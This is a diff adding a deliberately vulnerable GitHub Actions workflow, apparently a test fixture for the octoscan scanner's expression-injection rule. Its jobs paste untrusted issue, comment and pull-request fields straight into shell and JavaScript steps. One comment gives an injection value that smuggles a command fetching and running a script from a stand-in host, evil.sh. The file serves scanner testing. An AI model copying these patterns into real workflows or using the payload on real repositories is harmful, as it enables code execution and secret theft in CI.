@@ -1,0 +1,63 @@
+# VULNERABLE EXAMPLE for the "expression-injection" rule, do not use it as a template.
+# Run:    ./octoscan scan testdata/expression-injection.yml
+# expect: expression-injection=8
+
+# Untrusted data (issue, comment, PR title/body, branch name...) expanded with ${{ }} in a script is a command
+# injection: the value is pasted in the script before the shell runs it.
+name: Triage
+
+on:
+  issues:
+    types: [opened, edited]
+  issue_comment:
+    types: [created]
+  pull_request_target:
+    types: [opened, edited]
+
+jobs:
+  # the title of an issue: a title like  a"; curl evil.sh | sh; echo "  runs the command
+  greet:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'issues'
+    steps:
+      - run: echo "Thanks for opening ${{ github.event.issue.title }}"
+
+  # two untrusted values in the same string and a comment body in a multi-line script
+  comment:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'issue_comment'
+    steps:
+      - name: Log
+        run: |
+          echo "title is ${{ github.event.issue.title }}"
+          echo "comment: ${{ github.event.comment.body }}"
+
+  # github-script: the value ends up in JavaScript source
+  label:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'issues'
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const body = "${{ github.event.issue.body }}"
+            core.info(body)
+
+  # a fallback value does not make it safe, the name of the branch of the PR
+  pull-request:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'pull_request_target'
+    steps:
+      - run: echo "PR ${{ github.event.pull_request.title || 'without a title' }}"
+      - run: git log --oneline ${{ github.head_ref }}
+
+  # the label of the head of the PR (owner:branch) and the body of the PR
+  summary:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'pull_request_target'
+    steps:
+      - run: echo "from ${{ github.event.pull_request.head.label }}"
+      - run: |
+          cat > summary.md <<'EOF'
+          ${{ github.event.pull_request.body }}
+          EOF
